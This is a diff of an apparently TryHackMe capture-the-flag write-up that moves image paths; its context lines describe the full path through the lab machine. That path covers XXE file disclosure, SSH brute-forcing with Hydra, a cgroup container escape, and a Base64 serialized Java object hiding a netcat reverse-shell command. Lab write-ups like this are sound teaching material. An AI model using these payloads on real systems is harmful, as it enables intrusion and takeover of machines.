@@ -71,7 +71,7 @@ The scan revealed three interesting open ports:
 | `80/tcp` | HTTP | Main web application |
 | `3333/tcp` | Unknown/custom service | Investigated manually with Netcat |
 
-![Nmap](/assets/images/writeups/u_r_in_a_cave/1.png)
+![Nmap](/assets/images/writeups/thm/u_r_in_a_cave/1.png)
 
 ### Initial attack surface
 
@@ -107,7 +107,7 @@ http://<target-ip>/
 
 The question itself was a clue that this application was probably designed around **actions/commands** rather than ordinary pages.
 
-![browser](/assets/images/writeups/u_r_in_a_cave/2.png)
+![browser](/assets/images/writeups/thm/u_r_in_a_cave/2.png)
 
 I then checked port `3333` in the browser:
 
@@ -176,7 +176,7 @@ The scan revealed endpoints such as:
 - `walk`
 - `lamp`
 
-![ffuf](/assets/images/writeups/u_r_in_a_cave/3.png)
+![ffuf](/assets/images/writeups/thm/u_r_in_a_cave/3.png)
 
 ---
 
@@ -186,7 +186,7 @@ I opened the discovered endpoints manually.
 
 Instead of normal HTML responses, some of them returned what looked like encoded data.
 
-![hashes](/assets/images/writeups/u_r_in_a_cave/3_1.png)
+![hashes](/assets/images/writeups/thm/u_r_in_a_cave/3_1.png)
 
 The data looked like Base64, so I tested that hypothesis:
 
@@ -196,7 +196,7 @@ echo '<encoded-base64-data>' | base64 -d
 
 The decoded content was not a normal message. It looked like a **Java serialized object**.
 
-![decrypted](/assets/images/writeups/u_r_in_a_cave/3_2.png)
+![decrypted](/assets/images/writeups/thm/u_r_in_a_cave/3_2.png)
 
 This was an important clue.
 
@@ -265,7 +265,7 @@ I also searched the HTML for interesting keywords:
 curl -s http://<target-ip>/ | grep -Ei 'action|work|matches|search|walk'
 ```
 
-![curl](/assets/images/writeups/u_r_in_a_cave/3_3.png)
+![curl](/assets/images/writeups/thm/u_r_in_a_cave/3_3.png)
 
 ## Conceptually / Logically thinking
 
@@ -314,7 +314,7 @@ I tried the actions I had discovered during directory enumeration, including `se
 
 The service responded with information that exposed more clues about the application and its internal files.
 
-![nc](/assets/images/writeups/u_r_in_a_cave/3_4.png)
+![nc](/assets/images/writeups/thm/u_r_in_a_cave/3_4.png)
 
 This was an important turning point.
 
@@ -338,7 +338,7 @@ That immediately raised an interesting possibility:
 
 This is the classic situation where a penetration tester would test for **XML External Entity (XXE)**.
 
-![found xss](/assets/images/writeups/u_r_in_a_cave/3_5.png)
+![found xss](/assets/images/writeups/thm/u_r_in_a_cave/3_5.png)
 
 ---
 
@@ -399,13 +399,13 @@ For example:
 <root>&test;</root>
 ```
 
-![etc directory](/assets/images/writeups/u_r_in_a_cave/3_6.png)
+![etc directory](/assets/images/writeups/thm/u_r_in_a_cave/3_6.png)
 
 Eventually I was able to obtain contents from files including 
 
 `RPG.java`, `RPG.class`, `Action.class`, `Serialize.class`, `commons-io-2.7.jar`, `run.sh`
 
-![file contents](/assets/images/writeups/u_r_in_a_cave/3_7.png)
+![file contents](/assets/images/writeups/thm/u_r_in_a_cave/3_7.png)
 
 ---
 
@@ -441,7 +441,7 @@ For a difficult CTF, source-code disclosure can turn a guessing game into a code
 
 I inspected the recovered Java source and focused on `RPG.java`.
 
-![entry point for rv shell](/assets/images/writeups/u_r_in_a_cave/4.png)
+![entry point for rv shell](/assets/images/writeups/thm/u_r_in_a_cave/4.png)
 
 The important observation was that the application created an `Action` object and serialized it.
 
@@ -523,7 +523,7 @@ java RPG
 
 This generated the serialized output.
 
-![entry point for rv shell and base64 to serialized format](/assets/images/writeups/u_r_in_a_cave/4_1.png)
+![entry point for rv shell and base64 to serialized format](/assets/images/writeups/thm/u_r_in_a_cave/4_1.png)
 
 ---
 
@@ -584,7 +584,7 @@ The resulting request looked similar to:
 action.php?<xml>rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdABhdHJ5aW5nIjtybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjEyOS4yMzUgNDQ0NCA%2BL3RtcC9mO2VjaG8gInQAA2FiY3QAAA%3D%3D</xml>
 ```
 
-![cave shell](/assets/images/writeups/u_r_in_a_cave/4_2.png)
+![cave shell](/assets/images/writeups/thm/u_r_in_a_cave/4_2.png)
 
 The reverse shell connected back successfully.
 
@@ -626,7 +626,7 @@ I used it to generate possible passwords:
 exrex -o passwords "[REDACTED-REGEX]"
 ```
 
-![exrex](/assets/images/writeups/u_r_in_a_cave/5.png)
+![exrex](/assets/images/writeups/thm/u_r_in_a_cave/5.png)
 
 The result was a wordlist named:
 
@@ -670,11 +670,11 @@ So I tested the generated wordlist against SSH:
 hydra -l door -P passwords <target-ip> ssh -s 2222 -vV
 ```
 
-![hydra](/assets/images/writeups/u_r_in_a_cave/5_2.png)
+![hydra](/assets/images/writeups/thm/u_r_in_a_cave/5_2.png)
 
 Hydra eventually found a valid password.
 
-![password](/assets/images/writeups/u_r_in_a_cave/5_3.png)
+![password](/assets/images/writeups/thm/u_r_in_a_cave/5_3.png)
 
 I could then switch to the `door` user:
 
@@ -688,7 +688,7 @@ su door
 
 As the `door` user, I found an encrypted GPG file and a binary named `skeleton`.
 
-![door .gpg and ./skeleton](/assets/images/writeups/u_r_in_a_cave/5_2.png)
+![door .gpg and ./skeleton](/assets/images/writeups/thm/u_r_in_a_cave/5_2.png)
 
 At first, the important question was:
 
@@ -726,7 +726,7 @@ I downloaded it:
 curl http://adventurer.cave.thm/adventurer.priv -o adventurer.priv
 ```
 
-![subdomain and adventurer.priv](/assets/images/writeups/u_r_in_a_cave/5_5.png)
+![subdomain and adventurer.priv](/assets/images/writeups/thm/u_r_in_a_cave/5_5.png)
 
 This was the private key needed for the next stage.
 
@@ -874,7 +874,7 @@ Then:
 cat ~/message
 ```
 
-![GNUPGHOME and key](/assets/images/writeups/u_r_in_a_cave/5_6.png)
+![GNUPGHOME and key](/assets/images/writeups/thm/u_r_in_a_cave/5_6.png)
 
 The decrypted message contained the information needed for the next stage.
 
@@ -902,7 +902,7 @@ I then switched users:
 su skeleton
 ```
 
-![password of skeleton and su skeleton](/assets/images/writeups/u_r_in_a_cave/6.png)
+![password of skeleton and su skeleton](/assets/images/writeups/thm/u_r_in_a_cave/6.png)
 
 At this point the privilege chain looked like:
 
@@ -932,7 +932,7 @@ cat info.text
 
 The output did not immediately reveal everything I expected.
 
-![cat info.text](/assets/images/writeups/u_r_in_a_cave/6_1.png)
+![cat info.text](/assets/images/writeups/thm/u_r_in_a_cave/6_1.png)
 
 This is a good example of why normal `cat` is not always enough during Linux enumeration.
 
@@ -1008,7 +1008,7 @@ sudo -l
 
 The result showed that `skeleton` had permission to execute `/bin/kill` with elevated privileges.
 
-![kill](/assets/images/writeups/u_r_in_a_cave/6_2.png)
+![kill](/assets/images/writeups/thm/u_r_in_a_cave/6_2.png)
 
 My first instinct was to check GTFOBins for `/bin/kill`.
 
@@ -1044,7 +1044,7 @@ ps -ef --forest
 
 The process tree was especially useful because it showed parent-child relationships.
 
-![ps](/assets/images/writeups/u_r_in_a_cave/6_3.png)
+![ps](/assets/images/writeups/thm/u_r_in_a_cave/6_3.png)
 
 This is a valuable lesson:
 
@@ -1076,7 +1076,7 @@ The important relationship was:
              └── /root/start.sh
 ```
 
-![startcon -> start.sh](/assets/images/writeups/u_r_in_a_cave/6_4.png)
+![startcon -> start.sh](/assets/images/writeups/thm/u_r_in_a_cave/6_4.png)
 
 The key question became:
 
@@ -1157,7 +1157,7 @@ Then verified it:
 cat /root/start.sh
 ```
 
-![added reverse shell to start.sh](/assets/images/writeups/u_r_in_a_cave/start.sh.png)
+![added reverse shell to start.sh](/assets/images/writeups/thm/u_r_in_a_cave/start.sh.png)
 
 ### Why use `cat > file <<'EOF'`?
 
@@ -1239,7 +1239,7 @@ The process restart caused the modified startup script to execute again.
 
 Because the script contained my reverse shell, it connected back to my machine.
 
-![root@cave](/assets/images/writeups/u_r_in_a_cave/7.png)
+![root@cave](/assets/images/writeups/thm/u_r_in_a_cave/7.png)
 
 I now had a root shell on the `cave` environment.
 
@@ -1253,7 +1253,7 @@ After obtaining root, I checked the available information:
 cat info.txt
 ```
 
-![info.txt](/assets/images/writeups/u_r_in_a_cave/7_1.png)
+![info.txt](/assets/images/writeups/thm/u_r_in_a_cave/7_1.png)
 
 I obtained the root-level flag, but the machine indicated that the quest was **not finished yet**.
 
@@ -1273,7 +1273,7 @@ I checked the network interfaces:
 ip addr
 ```
 
-![ip addr](/assets/images/writeups/u_r_in_a_cave/7_2.png)
+![ip addr](/assets/images/writeups/thm/u_r_in_a_cave/7_2.png)
 
 The environment showed signs of Docker/container networking.
 
@@ -1377,7 +1377,7 @@ Finally, I triggered the cgroup event:
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-![escaped docker](/assets/images/writeups/u_r_in_a_cave/7_3.png)
+![escaped docker](/assets/images/writeups/thm/u_r_in_a_cave/7_3.png)
 
 ---
 
@@ -1426,7 +1426,7 @@ nc -lvnp 5555
 
 The container escape connected back to the listener.
 
-![listener](/assets/images/writeups/u_r_in_a_cave/7_4.png)
+![listener](/assets/images/writeups/thm/u_r_in_a_cave/7_4.png)
 
 This time the shell was outside the original container.
 
@@ -1438,7 +1438,7 @@ That confirmed that the earlier `root` shell was not the final environment.
 
 From the outside/host environment, I located the final flag.
 
-![outside flag](/assets/images/writeups/u_r_in_a_cave/7_5.png)
+![outside flag](/assets/images/writeups/thm/u_r_in_a_cave/7_5.png)
 
 The overall path was therefore:
 
@@ -1517,11 +1517,11 @@ The overall path was therefore:
 
 🖼️ **all summary screenshot:** 
 
-![all process screenshort 1](/assets/images/writeups/u_r_in_a_cave/all_process_1.png)
+![all process screenshort 1](/assets/images/writeups/thm/u_r_in_a_cave/all_process_1.png)
 
-![all process screenshort 2](/assets/images/writeups/u_r_in_a_cave/all_process_2.png)
+![all process screenshort 2](/assets/images/writeups/thm/u_r_in_a_cave/all_process_2.png)
 
-![all process screenshort 3](/assets/images/writeups/u_r_in_a_cave/all_process_3.png)
+![all process screenshort 3](/assets/images/writeups/thm/u_r_in_a_cave/all_process_3.png)
 
 
 
